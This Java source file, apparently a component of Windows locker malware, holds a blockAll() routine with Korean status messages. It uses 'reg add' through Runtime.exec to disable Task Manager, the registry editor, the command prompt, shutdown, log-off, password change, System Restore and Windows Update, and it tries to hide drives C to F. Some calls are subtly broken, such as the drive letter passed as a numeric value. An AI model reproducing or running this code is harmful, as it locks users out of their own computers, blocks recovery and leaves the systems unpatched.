package kr.pah;

import java.io.IOException;

public class ServiceBlock {
    public static void blockAll() {
        disableTaskManager();
        disableControlPanel();
        disableRegistryEditor();
        disableFolderOptions();
        disableRunCommand();
        disableSystemProperties();
        disableLogOff();
        disableChangePassword();
        disableShutDownOptions();
        disableCommandPrompt();
        disableNetworkProperties();
        disableSystemRestore();
        disableWindowsUpdate();
        disableDriveAccess("C");
        disableDriveAccess("D");
        disableDriveAccess("E");
        disableDriveAccess("F");
    }

    public static void disableTaskManager() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", "1");
            System.out.println("작업 관리자가 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("작업 관리자 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableControlPanel() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", "1");
            System.out.println("제어판이 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("제어판 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableRegistryEditor() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", "1");
            System.out.println("레지스트리 편집기가 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("레지스트리 편집기 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableFolderOptions() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", "1");
            System.out.println("파일 탐색기 옵션 변경이 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("파일 탐색기 옵션 변경 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableRunCommand() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", "1");
            System.out.println("실행 명령 사용이 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("실행 명령 사용 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableSystemProperties() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoPropertiesMyComputer", "1");
            System.out.println("시스템 설정 변경이 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("시스템 설정 변경 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableLogOff() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "StartMenuLogOff", "0");
            System.out.println("로그오프 옵션이 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("로그오프 옵션 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableChangePassword() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableChangePassword", "1");
            System.out.println("비밀번호 변경 옵션이 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("비밀번호 변경 옵션 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableShutDownOptions() {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoClose", "1");
            System.out.println("종료 옵션이 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("종료 옵션 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableCommandPrompt() {
        try {
            setRegistryValue("HKCU\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", "1");
            System.out.println("명령 프롬프트가 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("명령 프롬프트 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableNetworkProperties() {
        try {
            setRegistryValue("HKCU\\Software\\Policies\\Microsoft\\Windows\\Network Connections", "NC_LanProperties", "1");
            System.out.println("네트워크 설정 변경이 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("네트워크 설정 변경 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableSystemRestore() {
        try {
            setRegistryValue("HKLM\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore", "DisableSR", "1");
            System.out.println("시스템 복원 기능이 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("시스템 복원 기능 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableWindowsUpdate() {
        try {
            setRegistryValue("HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "NoAutoUpdate", "1");
            System.out.println("Windows 업데이트가 비활성화되었습니다.");
        } catch (Exception e) {
            System.err.println("Windows 업데이트 비활성화 중 오류 발생: " + e.getMessage());
        }
    }

    public static void disableDriveAccess(String driveLetter) {
        try {
            setRegistryValue("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDrives", driveLetter);
            System.out.println(driveLetter + " 드라이브 접근이 금지되었습니다.");
        } catch (Exception e) {
            System.err.println(driveLetter + " 드라이브 접근 금지 중 오류 발생: " + e.getMessage());
        }
    }

    private static void setRegistryValue(String path, String name, String value) {
        try {
            String command = "reg add \"" + path + "\" /v " + name + " /t REG_DWORD /d " + value + " /f";
            Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
